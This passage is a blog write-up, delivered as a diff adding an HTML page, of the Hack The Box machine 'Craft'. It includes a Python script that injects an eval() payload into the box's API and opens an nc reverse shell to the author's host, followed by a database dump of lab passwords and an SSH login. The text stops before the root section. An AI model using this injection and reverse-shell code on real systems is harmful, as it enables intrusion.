@@ -1,0 +1,395 @@
+<!doctype html><html lang=en-us><head><meta charset=UTF-8><meta name=viewport content="width=device-width,initial-scale=1"><meta http-equiv=X-UA-Compatible content="IE=edge"><style type=text/css>body{font-family:monospace}</style><meta name=description content="
+
+
+Quick Summary
+So!!
+Today was just retired Craft from Hack the box, this was a really fun box to do, and also I felt pretty well doing it, because even if I needed some nudges, it was actually the first box I got to the foothold without hints (elsen if I needed some guidance with python, thanks a lot @Frundrod!!), and afterward to get user I was a bit lost and also needed some hints (was not realizing something I have literally in my nose, thankss a lot @Fugl!), root was easy by a little bit of enumeration and reading help command output."><meta name=keywords content="linux,htb-medium,rce,python,code-analysis,web,ssh"><meta name=categories content="Hack the Box"><title>Hack The Box - Craft | Ceso Adventures</title><link rel=stylesheet href=https://ceso.github.io/css/smigle-lagom.css><link rel=icon href=data:image/png,><meta name=theme-color content="#ffffff"></head><body><div id=root><header><div id=brand><a class=icon-link href=https://ceso.github.io/><img class=icon src=https://ceso.github.io/images/site/logo.svg></a><div class=text><a href=https://ceso.github.io/ class=site-title>Ceso Adventures</a><h3>Blogs, Security CTFs & Tutorials</h3></div></div><nav><a href=https://ceso.github.io/><b>Home</b></a>
+|
+<a href=https://ceso.github.io/whoami/><b>Whoami</b></a>
+|
+<a href=https://ceso.github.io/posts/><b>Posts</b></a>
+|
+<a href=https://ceso.github.io/cheatsheets/><b>Cheatsheets</b></a>
+|
+<a href=https://ceso.github.io/resources><b>Resources</b></a>
+|
+<a href=https://ceso.github.io/videos><b>Videos</b></a>
+|
+<a href=https://ceso.github.io/categories/><b>Categories</b></a>
+|
+<a href=https://ceso.github.io/tags/><b>Tags</b></a>
+|
+<a href=https://ceso.github.io/index.xml><b>RSS</b></a></nav><hr></header><div id=content><main><article><h1 class=title>Hack The Box - Craft</h1><div class=post-meta><strong><span>Posted on</span>
+<time>2020-01-04</time>
+<span>in</span>
+<a href=https://ceso.github.io/categories/hack-the-box>Hack the Box</a></strong><div><span>Tags:</span>
+<a href=https://ceso.github.io/tags/linux>linux</a>,
+<a href=https://ceso.github.io/tags/htb-medium>htb-medium</a>,
+<a href=https://ceso.github.io/tags/rce>rce</a>,
+<a href=https://ceso.github.io/tags/python>python</a>,
+<a href=https://ceso.github.io/tags/code-analysis>code-analysis</a>,
+<a href=https://ceso.github.io/tags/web>web</a>,
+<a href=https://ceso.github.io/tags/ssh>ssh</a></div></div><pre class=asciitoc>.
+├── <a href=#quick-summary>Quick Summary</a>
+├── <a href=#nmap>Nmap</a>
+├── <a href=#web-enumeration>Web enumeration</a>
+├── <a href=#rce>RCE</a>
+└── <a href=#root>root</a>
+</pre><div class=content><img src=https://ceso.github.io/images/htb/craft/info-card.png class=center style=border-radius:8px><h2 id=quick-summary>Quick Summary</h2><p>So!!
+Today was just retired Craft from Hack the box, this was a really fun box to do, and also I felt pretty well doing it, because even if I needed some nudges, it was actually the first box I got to the foothold without hints (elsen if I needed some guidance with python, thanks a lot @Frundrod!!), and afterward to get user I was a bit lost and also needed some hints (was not realizing something I have literally in my nose, thankss a lot <a href=https://www.hackthebox.eu/profile/103596>@Fugl!</a>), root was easy by a little bit of enumeration and reading help command output.</p><p>I had so much fun with this box trying to break in before it was going to be retired, that challenge of doing it with a few hours of deadline felt so god!</p><p>Said that, let&rsquo;s start with the real write up!</p><h2 id=nmap>Nmap</h2><p>We start running nmap to scan for open ports and services:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-console data-lang=console><span style=display:flex><span>root@kali:~/Documents/HTB/boxes/medium/linux/craft# nmap -sC -sV -O 10.10.10.110 -o ininitial-nmap.htb
+</span></span><span style=display:flex><span>Starting Nmap 7.80 ( https://nmap.org ) at 2019-12-23 17:21 EST
+</span></span><span style=display:flex><span>Nmap scan report for 10.10.10.110
+</span></span><span style=display:flex><span>Host is up (0.082s latency).
+</span></span><span style=display:flex><span>Not shown: 998 closed ports
+</span></span><span style=display:flex><span>PORT    STATE SERVICE  VERSION
+</span></span><span style=display:flex><span>22/tcp  open  ssh      OpenSSH 7.4p1 Debian 10+deb9u5 (protocol 2.0)
+</span></span><span style=display:flex><span>| ssh-hostkey: 
+</span></span><span style=display:flex><span>|   2048 bd:e7:6c:22:81:7a:db:3e:c0:f0:73:1d:f3:af:77:65 (RSA)
+</span></span><span style=display:flex><span>|   256 82:b5:f9:d1:95:3b:6d:80:0f:35:91:86:2d:b3:d7:66 (ECDSA)
+</span></span><span style=display:flex><span>|_  256 28:3b:26:18:ec:df:b3:36:85:9c:27:54:8d:8c:e1:33 (ED25519)
+</span></span><span style=display:flex><span>443/tcp open  ssl/http nginx 1.15.8
+</span></span><span style=display:flex><span>|_http-server-header: nginx/1.15.8
+</span></span><span style=display:flex><span>|_http-title: About
+</span></span><span style=display:flex><span>| ssl-cert: Subject: commonName=craft.htb/organizationName=Craft/stateOrProvinceName=NY/countryName=US
+</span></span><span style=display:flex><span>| Not valid before: 2019-02-06T02:25:47
+</span></span><span style=display:flex><span>|_Not valid after:  2020-06-20T02:25:47
+</span></span><span style=display:flex><span>|_ssl-date: TLS randomness does not represent time
+</span></span><span style=display:flex><span>| tls-alpn: 
+</span></span><span style=display:flex><span>|_  http/1.1
+</span></span><span style=display:flex><span>| tls-nextprotoneg: 
+</span></span><span style=display:flex><span>|_  http/1.1
+</span></span><span style=display:flex><span>No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+</span></span><span style=display:flex><span>TCP/IP fingerprint:
+</span></span><span style=display:flex><span>OS:SCAN(V=7.80%E=4%D=12/23%OT=22%CT=1%CU=35537%PV=Y%DS=2%DC=I%G=Y%TM=5E013E
+</span></span><span style=display:flex><span>OS:1F%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=108%TI=Z%CI=Z%II=I%TS=8)OP
+</span></span><span style=display:flex><span>OS:S(O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST
+</span></span><span style=display:flex><span>OS:11NW7%O6=M54DST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)EC
+</span></span><span style=display:flex><span>OS:N(R=Y%DF=Y%T=40%W=7210%O=M54DNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=
+</span></span><span style=display:flex><span>OS:AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(
+</span></span><span style=display:flex><span>OS:R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%
+</span></span><span style=display:flex><span>OS:F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N
+</span></span><span style=display:flex><span>OS:%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%C
+</span></span><span style=display:flex><span>OS:D=S)
+</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>Network Distance: 2 hops
+</span></span><span style=display:flex><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style=display:flex><span>Nmap done: 1 IP address (1 host up) scanned in 32.11 seconds
+</span></span></code></pre></div><p>We got port port 22 (SSH) and 443 (HTTPS) are open.</p><h2 id=web-enumeration>Web enumeration</h2><p>The home page is kind-empty, but if we position the cursor on API and the Github logo, we see at the bottom that it will redirect to <code>https://api.craft.htb</code> and <code>https://gogs.craft.htb</code>, we will add them to <code>/etc/hosts</code> pointing to the IP of craft <code>10.10.10.110</code>.</p><p><img src=https://ceso.github.io/images/htb/craft/1-web-enum.png class=center style=border-radius:8px>
+<img src=https://ceso.github.io/images/htb/craft/2-web-enum.png class=center style=border-radius:8px></p><p>Afterwards, we jump into <code>https://api.craft.htb</code> and we can see the endpoints and how to interact with them.</p><img src=https://ceso.github.io/images/htb/craft/1-api.png class=center style=border-radius:8px>
+<img src=https://ceso.github.io/images/htb/craft/2-api.png class=center style=border-radius:8px>
+<img src=https://ceso.github.io/images/htb/craft/3-api.png class=center style=border-radius:8px><p>We don&rsquo;t have at the moment any credentials to identify, so we go to <code>https://gogs.craft.htb</code> in order to see if we can find something.</p><img src=https://ceso.github.io/images/htb/craft/1-gogs.png class=center style=border-radius:8px>
+<img src=https://ceso.github.io/images/htb/craft/2-gogs.png class=center style=border-radius:8px>
+<img src=https://ceso.github.io/images/htb/craft/3-gogs.png class=center style=border-radius:8px><p>We see in explore there is a repository named <code>craft-api</code> and that the users is our gang from Silicon Valley.</p><p>We jump into the repository, and start looking if we can find something.</p><img src=https://ceso.github.io/images/htb/craft/4-gogs.png class=center style=border-radius:8px><p>There is an issue open, so we go inside it, and there is a &ldquo;fix&rdquo;, one that Gilfoyle is not happy about it.</p><img src=https://ceso.github.io/images/htb/craft/5-gogs.png class=center style=border-radius:8px><p>So, there is the use of an <code>eval()</code>, that&rsquo;s something we could use to inject a command.</p><img src=https://ceso.github.io/images/htb/craft/6-gogs.png class=center style=border-radius:8px><p>Taking a look into the commits made by Denish, we found in the commit <code>a2d28ed155</code> that he removed hardcoded credentials, exactly the kind of things we needed:</p><img src=https://ceso.github.io/images/htb/craft/7-gogs.png class=center style=border-radius:8px><h2 id=rce>RCE</h2><p>Now with credentials, knowing we could take advantage of the <code>eval()</code> and remembering the curl Denish was using in his issue + the API, we can make an injection via a POST to <code>/api/brew/</code>.
+I wrote a small script to authenticate and post that does the injection (tbh, I missed I could just use <code>test.py</code> realized about it late). grabbing the token and using it to authenticate.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-console data-lang=console><span style=display:flex><span>root@kali:~/Documents/HTB/boxes/medium/linux/craft# cat craft_inject.py 
+</span></span><span style=display:flex><span>#!/usr/bin/python3
+</span></span><span style=display:flex><span># -*- coding: utf-8 -*-
+</span></span><span style=display:flex><span>import requests
+</span></span><span style=display:flex><span>import re
+</span></span><span style=display:flex><span>import json
+</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>url = &#34;https://api.craft.htb/api/auth/login&#34;
+</span></span><span style=display:flex><span>login=(&#39;dinesh&#39;, &#39;4aUh0A8PbVJxgd&#39;)
+</span></span><span style=display:flex><span>r = requests.get(url, auth=login, allow_redirects=False, verify=False)
+</span></span><span style=display:flex><span>token = json.loads(r.text)[&#39;token&#39;]
+</span></span><span style=display:flex><span>print(token)
+</span></span><span style=display:flex><span>url = &#34;https://api.craft.htb/api/brew/&#34;
+</span></span><span style=display:flex><span>headers = {&#39;X-Craft-API-Token&#39;:token, &#39;Content-Type&#39;: &#39;application/json&#39;}
+</span></span><span style=display:flex><span>inject = &#34;&#34;&#34;__import__(&#34;os&#34;).system(&#34;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.16 4444 &gt;/tmp/f&#34;)&#34;&#34;&#34;
+</span></span><span style=display:flex><span>payload = {&#34;name&#34;:&#34;foo&#34;,&#34;brewer&#34;:&#34;foo&#34;, &#34;style&#34;:&#34;foo&#34;, &#34;abv&#34;:inject}
+</span></span><span style=display:flex><span>payload = json.dumps(payload)
+</span></span><span style=display:flex><span>attack = requests.post(url, verify=False, headers=headers, allow_redirects=False, data=payload)
+</span></span></code></pre></div><p>In one tab run nc listening on port 4444 with <code>nc -lvp 4444</code>, and run in other tab we run the script to get the reverse:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-console data-lang=console><span style=display:flex><span>root@kali:~/Documents/HTB/boxes/medium/linux/craft# ./craft_inject.py 
+</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-console data-lang=console><span style=display:flex><span>root@kali:~/Documents/HTB/boxes/medium/linux/craft# nc -lvp 4444
+</span></span><span style=display:flex><span>listening on [any] 4444 ...
+</span></span><span style=display:flex><span>connect to [10.10.14.16] from api.craft.htb [10.10.10.110] 41887
+</span></span><span style=display:flex><span>/bin/sh: can&#39;t access tty; job control turned off
+</span></span><span style=display:flex><span>/opt/app # whoami
+</span></span><span style=display:flex><span>root
+</span></span><span style=display:flex><span>/opt/app # id
+</span></span><span style=display:flex><span>uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
+</span></span></code></pre></div><p>There is something weird, we are already root? we check if there is the <code>root.txt</code> in it&rsquo;s home and not, is not:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-console data-lang=console><span style=display:flex><span>/opt/app # cd /root
+</span></span><span style=display:flex><span>/root # ls -la
+</span></span><span style=display:flex><span>total 12
+</span></span><span style=display:flex><span>drwx------    1 root     root          4096 Feb  9  2019 .
+</span></span><span style=display:flex><span>drwxr-xr-x    1 root     root          4096 Feb 10  2019 ..
+</span></span><span style=display:flex><span>drwx------    1 root     root          4096 Feb  9  2019 .cache
+</span></span><span style=display:flex><span>/root # 
+</span></span></code></pre></div><p>So we start enumerating and realize we are inside a jail (specifically a docker container, busybox):</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-console data-lang=console><span style=display:flex><span>/opt/app # ls -la /
+</span></span><span style=display:flex><span>total 64
+</span></span><span style=display:flex><span>drwxr-xr-x    1 root     root          4096 Feb 10  2019 .
+</span></span><span style=display:flex><span>drwxr-xr-x    1 root     root          4096 Feb 10  2019 ..
+</span></span><span style=display:flex><span>-rwxr-xr-x    1 root     root             0 Feb 10  2019 .dockerenv
+</span></span><span style=display:flex><span>drwxr-xr-x    1 root     root          4096 Feb  6  2019 bin
+</span></span><span style=display:flex><span>drwxr-xr-x    5 root     root           340 Jan  4 20:47 dev
+</span></span><span style=display:flex><span>drwxr-xr-x    1 root     root          4096 Feb 10  2019 etc
+</span></span><span style=display:flex><span>drwxr-xr-x    2 root     root          4096 Jan 30  2019 home
+</span></span><span style=display:flex><span>drwxr-xr-x    1 root     root          4096 Feb  6  2019 lib
+</span></span><span style=display:flex><span>drwxr-xr-x    5 root     root          4096 Jan 30  2019 media
+</span></span><span style=display:flex><span>drwxr-xr-x    2 root     root          4096 Jan 30  2019 mnt
+</span></span><span style=display:flex><span>drwxr-xr-x    1 root     root          4096 Feb  9  2019 opt
+</span></span><span style=display:flex><span>dr-xr-xr-x  208 root     root             0 Jan  4 20:47 proc
+</span></span><span style=display:flex><span>drwx------    1 root     root          4096 Feb  9  2019 root
+</span></span><span style=display:flex><span>drwxr-xr-x    2 root     root          4096 Jan 30  2019 run
+</span></span><span style=display:flex><span>drwxr-xr-x    2 root     root          4096 Jan 30  2019 sbin
+</span></span><span style=display:flex><span>drwxr-xr-x    2 root     root          4096 Jan 30  2019 srv
+</span></span><span style=display:flex><span>dr-xr-xr-x   13 root     root             0 Jan  4 20:47 sys
+</span></span><span style=display:flex><span>drwxrwxrwt    1 root     root          4096 Jan  4 20:48 tmp
+</span></span><span style=display:flex><span>drwxr-xr-x    1 root     root          4096 Feb  9  2019 usr
+</span></span><span style=display:flex><span>drwxr-xr-x    1 root     root          4096 Jan 30  2019 var
+</span></span><span style=display:flex><span>/opt/app # ls -la /usr/bin
+</span></span><span style=display:flex><span>total 13236
+</span></span><span style=display:flex><span>drwxr-xr-x    1 root     root          4096 Feb  9  2019 .
+</span></span><span style=display:flex><span>drwxr-xr-x    1 root     root          4096 Feb  9  2019 ..
+</span></span><span style=display:flex><span>lrwxrwxrwx    1 root     root             8 Feb  9  2019 2to3 -&gt; 2to3-3.6
+</span></span><span style=display:flex><span>-rwxr-xr-x    1 root     root            95 Jan 24  2019 2to3-3.6
+</span></span><span style=display:flex><span>lrwxrwxrwx    1 root     root            12 Feb  6  2019 [ -&gt; /bin/busybox
+</span></span><span style=display:flex><span>lrwxrwxrwx    1 root     root            12 Jan 30  2019 [[ -&gt; /bin/busybox
+</span></span><span style=display:flex><span>-rwxr-xr-x    1 root     root         34944 Jan  2  2019 addr2line
+</span></span><span style=display:flex><span>-rwxr-xr-x    2 root     root         55240 Jan  2  2019 ar
+</span></span><span style=display:flex><span>-rwxr-xr-x    2 root     root        814672 Jan  2  2019 as
+</span></span><span style=display:flex><span>lrwxrwxrwx    1 root     root            12 Jan 30  2019 awk -&gt; /bin/busybox
+</span></span><span style=display:flex><span>lrwxrwxrwx    1 root     root            12 Feb  6  2019 basename -&gt; /bin/busybox
+</span></span><span style=display:flex><span>lrwxrwxrwx    1 root     root            12 Jan 30  2019 beep -&gt; /bin/busybox
+</span></span><span style=display:flex><span>lrwxrwxrwx    1 root     root            12 Jan 30  2019 blkdiscard -&gt; /bin/busybox
+</span></span><span style=display:flex><span>lrwxrwxrwx    1 root     root            12 Jan 30  2019 bunzip2 -&gt; /bin/busybox
+</span></span><span style=display:flex><span>lrwxrwxrwx    1 root     root            12 Jan 30  2019 bzcat -&gt; /bin/busybox
+</span></span><span style=display:flex><span>lrwxrwxrwx    1 root     root            12 Jan 30  2019 bzip2 -&gt; /bin/busybox
+</span></span><span style=display:flex><span>-rwxr-xr-x    1 root     root         30440 Jan  2  2019 c++filt
+</span></span><span style=display:flex><span>-rwxr-xr-x    1 root     root           214 Jan  3  2019 c89
+</span></span><span style=display:flex><span>-rwxr-xr-x    1 root     root           205 Jan  3  2019 c99
+</span></span><span style=display:flex><span>-rwxr-xr-x    1 root     root         14208 Jan 29  2019 c_rehash
+</span></span><span style=display:flex><span>lrwxrwxrwx    1 root     root            12 Jan 30  2019 cal -&gt; /bin/busybox
+</span></span><span style=display:flex><span>lrwxrwxrwx    1 root     root             3 Feb  9  2019 cc -&gt; gcc
+</span></span><span style=display:flex><span>lrwxrwxrwx    1 root     root            12 Jan 30  2019 chvt -&gt; /bin/busybox
+</span></span><span style=display:flex><span>lrwxrwxrwx    1 root     root            12 Feb  6  2019 cksum -&gt; /bin/busybox
+</span></span><span style=display:flex><span>lrwxrwxrwx    1 root     root            12 Jan 30  2019 clear -&gt; /bin/busybox
+</span></span><span style=display:flex><span>lrwxrwxrwx    1 root     root            12 Jan 30  2019 cmp -&gt; /bin/busybox
+</span></span><span style=display:flex><span>lrwxrwxrwx    1 root     root            12 Feb  6  2019 comm -&gt; /bin/busybox
+</span></span><span style=display:flex><span>lrwxrwxrwx    1 root     root            12 Jan 30  2019 cpio -&gt; /bin/busybox
+</span></span><span style=display:flex><span>-rwxr-xr-x    1 root     root        898192 Jan  3  2019 cpp
+</span></span><span style=display:flex><span>lrwxrwxrwx    1 root     root            12 Jan 30  2019 crontab -&gt; /bin/busybox
+</span></span><span style=display:flex><span>lrwxrwxrwx    1 root     root            12 Jan 30  2019 cryptpw -&gt; /bin/busybox
+</span></span></code></pre></div><p>Inside the directory were we started <code>/opt/app</code> we see if there is something interesting:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-console data-lang=console><span style=display:flex><span>/opt/app # ls -la
+</span></span><span style=display:flex><span>total 32
+</span></span><span style=display:flex><span>drwxr-xr-x    5 root     root          4096 Feb 10  2019 .
+</span></span><span style=display:flex><span>drwxr-xr-x    1 root     root          4096 Feb  9  2019 ..
+</span></span><span style=display:flex><span>drwxr-xr-x    8 root     root          4096 Feb  8  2019 .git
+</span></span><span style=display:flex><span>-rw-r--r--    1 root     root            18 Feb  7  2019 .gitignore
+</span></span><span style=display:flex><span>-rw-r--r--    1 root     root          1585 Feb  7  2019 app.py
+</span></span><span style=display:flex><span>drwxr-xr-x    5 root     root          4096 Feb  7  2019 craft_api
+</span></span><span style=display:flex><span>-rwxr-xr-x    1 root     root           673 Feb  8  2019 dbtest.py
+</span></span><span style=display:flex><span>drwxr-xr-x    2 root     root          4096 Feb  7  2019 tests
+</span></span><span style=display:flex><span>/opt/app # grep -ir &#39;\(pass\|password\|passwd\)&#39; *       
+</span></span><span style=display:flex><span>app.py:    flask_app.config[&#39;SQLALCHEMY_DATABASE_URI&#39;] = &#39;mysql+pymysql://%s:%s@%s/%s&#39; % ( settings.MYSQL_DATABASE_USER, settings.MYSQL_DATABASE_PASSWORD, settings.MYSQL_DATABASE_HOST, settings.MYSQL_DATABASE_DB)
+</span></span><span style=display:flex><span>craft_api/api/auth/endpoints/__pycache__/auth.cpython-36.pyc:        Create an authentication token provided valid username and password.
+</span></span><span style=display:flex><span>craft_api/api/auth/endpoints/auth.py:        auth_results = User.query.filter(User.username == auth.username, User.password == auth.password).one()
+</span></span><span style=display:flex><span>craft_api/api/auth/endpoints/auth.py:        Create an authentication token provided valid username and password.
+</span></span><span style=display:flex><span>craft_api/database/models.py:    password = db.Column(db.String(80))
+</span></span><span style=display:flex><span>craft_api/database/models.py:    def __init__(self, username, password):
+</span></span><span style=display:flex><span>craft_api/database/models.py:        self.password = password
+</span></span><span style=display:flex><span>craft_api/settings.py:MYSQL_DATABASE_PASSWORD = &#39;qLGockJ6G2J75O&#39;
+</span></span><span style=display:flex><span>dbtest.py:                             password=settings.MYSQL_DATABASE_PASSWORD,
+</span></span><span style=display:flex><span>/opt/app # 
+</span></span></code></pre></div><p>There we see we have credentials for the database, we took a deep look into <code>craft_api/settings.py</code> to see which one is the user, and it&rsquo;s <code>craft</code>, we take a look into the <code>dbtest.py</code> we found early under <code>/opt/app</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-console data-lang=console><span style=display:flex><span>/opt/app # cat dbtest.py
+</span></span><span style=display:flex><span>#!/usr/bin/env python
+</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>import pymysql
+</span></span><span style=display:flex><span>from craft_api import settings
+</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span># test connection to mysql database
+</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>connection = pymysql.connect(host=settings.MYSQL_DATABASE_HOST,
+</span></span><span style=display:flex><span>                             user=settings.MYSQL_DATABASE_USER,
+</span></span><span style=display:flex><span>                             password=settings.MYSQL_DATABASE_PASSWORD,
+</span></span><span style=display:flex><span>                             db=settings.MYSQL_DATABASE_DB,
+</span></span><span style=display:flex><span>                             cursorclass=pymysql.cursors.DictCursor)
+</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>try: 
+</span></span><span style=display:flex><span>    with connection.cursor() as cursor:
+</span></span><span style=display:flex><span>        sql = &#34;SELECT `id`, `brewer`, `name`, `abv` FROM `brew` LIMIT 1&#34;
+</span></span><span style=display:flex><span>        cursor.execute(sql)
+</span></span><span style=display:flex><span>        result = cursor.fetchone()
+</span></span><span style=display:flex><span>        print(result)
+</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>finally:
+</span></span><span style=display:flex><span>    connection.close()
+</span></span><span style=display:flex><span>/opt/app #
+</span></span></code></pre></div><p>It&rsquo;s using pymsql to interact with the database, going to the documentation of it, we see that what we need is to use the <code>method fetchall()</code>
+<img src=https://ceso.github.io/images/htb/craft/1-rce.png class=center style=border-radius:8px>
+So, I change the script to do a <code>show tables</code> using <code>fetchall()</code> instead of <code>fetchone()</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-console data-lang=console><span style=display:flex><span>/opt/app # sed -i &#39;s/result \= cursor.fetchone()/sql \= \&#34;show tables\&#34;/&#39; dbtest.py
+</span></span><span style=display:flex><span>/opt/app # sed -i &#39;s/result \= cursor.fetchone()/result \= cursor.fetchall()/&#39; dbtest.py
+</span></span></code></pre></div><p>And post that, we ran the script, and we get 2 tables one that looks interesting named <code>user</code>, we modify again the sql query but to select all the records from that table:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-console data-lang=console><span style=display:flex><span>/opt/app # python dbtest.py
+</span></span><span style=display:flex><span>[{&#39;Tables_in_craft&#39;: &#39;brew&#39;}, {&#39;Tables_in_craft&#39;: &#39;user&#39;}]
+</span></span><span style=display:flex><span>/opt/app # sed -i &#39;s/sql \= \&#34;show tables\&#34;/sql \= \&#34;SELECT * FROM user\&#34;/&#39; dbtest.py
+</span></span><span style=display:flex><span>/opt/app # python dbtest.py
+</span></span><span style=display:flex><span>[{&#39;id&#39;: 1, &#39;username&#39;: &#39;dinesh&#39;, &#39;password&#39;: &#39;4aUh0A8PbVJxgd&#39;}, {&#39;id&#39;: 4, &#39;username&#39;: &#39;ebachman&#39;, &#39;password&#39;: &#39;llJ77D8QFkLPQB&#39;}, {&#39;id&#39;: 5, &#39;username&#39;: &#39;gilfoyle&#39;, &#39;password&#39;: &#39;ZEU3N8WNM2rh4T&#39;}]
+</span></span><span style=display:flex><span>/opt/app # 
+</span></span></code></pre></div><p>So, we got the users <code>dinesh, ebachman and gilfoyle</code> and it&rsquo;s respective passwords, with that we go to <code>https://gogs.craft.htb</code> again and login as <code>gilfoyle</code> and we found that he has a private repo to deploy the infra called <code>craft-infra</code></p><img src=https://ceso.github.io/images/htb/craft/1-gil.png class=center style=border-radius:8px>
+<img src=https://ceso.github.io/images/htb/craft/2-gil.png class=center style=border-radius:8px><p>We notice there exists a <code>.ssh</code> folder, we look into it and we get a pair of public/private ssh keys:</p><img src=https://ceso.github.io/images/htb/craft/3-gil.png class=center style=border-radius:8px><p>We try to login via ssh as <code>gilfoyle</code> re-using the password we got earlier and we found a success (actually the first tries it failed for me, and spent some hours trying to break the id_rsa with john without success, so give a new try with trying the founded passwords):</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-console data-lang=console><span style=display:flex><span>root@kali:~/Documents/HTB/boxes/medium/linux/craft# ssh gilfoyle@10.10.10.110 -i id_rsa
+</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>  .   *   ..  . *  *
+</span></span><span style=display:flex><span>*  * @()Ooc()*   o  .
+</span></span><span style=display:flex><span>    (Q@*0CG*O()  ___
+</span></span><span style=display:flex><span>   |\_________/|/ _ \
+</span></span><span style=display:flex><span>   |  |  |  |  | / | |
+</span></span><span style=display:flex><span>   |  |  |  |  | | | |
+</span></span><span style=display:flex><span>   |  |  |  |  | | | |
+</span></span><span style=display:flex><span>   |  |  |  |  | | | |
+</span></span><span style=display:flex><span>   |  |  |  |  | | | |
+</span></span><span style=display:flex><span>   |  |  |  |  | \_| |
+</span></span><span style=display:flex><span>   |  |  |  |  |\___/
+</span></span><span style=display:flex><span>   |\_|__|__|_/|
+</span></span><span style=display:flex><span>    \_________/
+</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>Enter passphrase for key &#39;id_rsa&#39;: 
+</span></span><span style=display:flex><span>Linux craft.htb 4.9.0-8-amd64 #1 SMP Debian 4.9.130-2 (2018-10-27) x86_64
+</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>The programs included with the Debian GNU/Linux system are free software;
+</span></span><span style=display:flex><span>the exact distribution terms for each program are described in the
+</span></span><span style=display:flex><span>individual files in /usr/share/doc/*/copyright.
+</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+</span></span><span style=display:flex><span>permitted by applicable law.
+</span></span><span style=display:flex><span>Last login: Fri Jan  3 23:45:10 2020 from 10.10.14.16
+</span></span><span style=display:flex><span>gilfoyle@craft:~$ id
+</span></span><span style=display:flex><span>uid=1001(gilfoyle) gid=1001(gilfoyle) groups=1001(gilfoyle)
+</span></span><span style=display:flex><span>gilfoyle@craft:~$ wc -c user.txt 
+</span></span><span style=display:flex><span>33 user.txt
